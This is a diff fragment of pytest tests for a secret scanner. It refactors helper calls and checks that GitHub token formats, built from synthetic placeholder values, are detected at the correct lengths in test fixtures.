         combined = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
         assert len(combined) == 2
@@ -10749,7 +10765,7 @@ class TestOneObservationIsOneFinding:
     def _at(rule_id: str, line: int):
         from cordon_scanner.core.models import Location
 
-        return a_finding(rule_id=rule_id, location=Location(path="i.js", line=line))
+        return Support.a_finding(rule_id=rule_id, location=Location(path="i.js", line=line))
 
     def _scan(self, tmp_path):
         (tmp_path / "package.json").write_text(
@@ -10943,27 +10959,29 @@ class TestAPrefixIsHalfOfAFormat:
         ],
     )
     def test_a_body_of_the_wrong_length_is_not_a_token(self, body: bytes) -> None:
-        assert not self._matches(assemble("ghp", "_").encode() + body)
+        assert not self._matches(Support.assemble("ghp", "_").encode() + body)
 
     @pytest.mark.parametrize("prefix", ["ghp", "gho", "ghu", "ghs", "ghr"])
     def test_every_documented_prefix_at_the_documented_length(self, prefix: str) -> None:
-        token = assemble(prefix, "_").encode() + b"".join(bytes((c,)) for c in (b"aB3" * 12))
+        token = Support.assemble(prefix, "_").encode() + b"".join(
+            bytes((c,)) for c in (b"aB3" * 12)
+        )
         assert self._matches(token)
 
     def test_a_fine_grained_token(self) -> None:
-        token = assemble("github", "_pat_").encode() + b"A" * 22 + b"_" + b"b" * 59
+        token = Support.assemble("github", "_pat_").encode() + b"A" * 22 + b"_" + b"b" * 59
         assert self._matches(token)
 
     def test_pike_stops_and_a_real_token_does_not(self, tmp_path) -> None:
         (tmp_path / "fixture.tf").write_text(
             'resource "azurerm_source_control_token" "pike_gen" {\n'
             '  type  = "GitHub"\n'
-            f'  token = "{assemble("ghp", "_")}{"s" * 25}"\n'
+            f'  token = "{Support.assemble("ghp", "_")}{"s" * 25}"\n'
             "}\n",
             encoding="utf-8",
         )
         (tmp_path / "leaked.tf").write_text(
-            f'  token = "{assemble("ghp", "_")}{"aB3" * 12}"\n', encoding="utf-8"
+            f'  token = "{Support.assemble("ghp", "_")}{"aB3" * 12}"\n', encoding="utf-8"
         )
         found = [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.GITHUB.TOKEN.001"
